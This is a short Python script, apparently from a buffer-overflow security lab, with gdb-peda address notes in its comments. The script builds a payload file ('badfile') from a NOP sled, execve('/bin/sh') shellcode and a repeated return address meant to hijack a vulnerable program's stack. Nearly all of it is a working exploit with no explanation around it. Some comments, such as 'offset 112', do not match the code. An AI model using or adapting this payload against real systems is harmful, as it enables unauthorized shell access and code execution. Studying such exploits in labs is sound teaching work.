# gdb-peda$ p $ebp
# $1 = (void *) 0xffffd2a8
# gdb-peda$ p &arr
# $2 = (int (*)[26]) 0xffffd238
# gdb-peda$ p &buffer 
# $3 = (char (*)[699]) 0xffffcf7d
import sys 
 
shellcode= ( 
"\x31\xc0" 
"\x50"  
"\x68""//sh" 
"\x68""/bin" 
"\x89\xe3" 
"\x50" 
"\x53" 
"\x89\xe1" 
"\x99" 
"\xb0\x0b" 
"\xcd\x80" 
).encode('latin-1') 
 
# Fill the content with NOPs 
content = bytearray(0x90 for i in range(830)) 
# Put the shellcode at the end 
# start = 804 - len(shellcode) 
# content[start:] = shellcode 
content[401:401+len(shellcode)] = shellcode 
 
# Put the address at offset 112 
ret = 0xffffd278 -  600

# content[815:815+4] = (ret).to_bytes(4,byteorder='little')

for i in range(815-4*10,830, 4):
    content[i:i+4] = (ret).to_bytes(4,byteorder='little') 
 
# Write the content to a file 
with open('badfile', 'wb') as f: 
    f.write(content) 

